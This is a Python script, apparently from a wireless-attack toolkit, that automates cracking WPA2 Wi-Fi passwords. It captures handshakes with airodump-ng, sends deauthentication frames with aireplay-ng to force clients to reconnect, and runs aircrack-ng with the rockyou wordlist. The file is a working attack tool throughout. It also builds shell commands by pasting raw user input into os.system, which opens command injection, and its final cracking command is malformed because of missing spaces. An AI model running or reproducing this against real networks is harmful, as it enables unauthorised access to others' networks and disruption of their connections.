import os
import subprocess
from monitormode import switch_monitor_mode

def wpa_capture_password_cracking():
    """
    Perform WPA2 handshake capture for password cracking
    """
    switch_monitor_mode()

    print("Select option for password cracking")
    print("---------------------------------------------------------------------")
    print("1. Crack password using already existing capture file")
    print("2. Capture WPA handshake and then crack network password")
    print("---------------------------------------------------------------------")
    
    option = int(input())
    print(option)

    match option:
        case 1:
            os.chdir("..")
            capture_file = input("Enter the name of the .cap capture file: ")
            os.system(" aircrack-ng -a2 -w wordlists/rockyou.txt " + capture_file)

        case 2:
            try:
                os.system("airodump-ng --band abg wlan0mon")

                package_name = input("Name of directory to save the package: ")
                passed_bssid = input("Enter the passed_bssid of any network to be sniffed: ")
                channel = input("Enter the channel this network is working on: ")
                os.system("mkdir SniffedNetworkData/" + package_name)

                capFile_name = input("Enter the name to be assigned to the wireshark capture file: ")
                os.system("airodump-ng -c " + channel + " --bssid " + passed_bssid + " -w SniffedNetworkData/" + package_name + "/" + capFile_name + " wlan0mon")
                # command1 = ["airodump-ng", "-c", channel, "--bssid", passed_bssid, "-w", "SniffedNetworkData/" + package_name + "/" + capFile_name, "wlan0mon"]
                command2 = ["aireplay-ng", "-0", "10", "-a", passed_bssid, "wlan0mon"]

                # subprocess.Popen(command1)
                subprocess.Popen(command2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                print("Paste the path for generated capture file ")
                capFile_path = input()

                os.system("wireshark " + capFile_path)
                os.system("aircrack-ng -a2 -b" + passed_bssid + "-w ../wordlists/rockyou.txt " + capFile_path)
            except Exception as e:
                print(f"Error performing WPA2 handshake: {e}")
        case _:
            print("Invalid option")
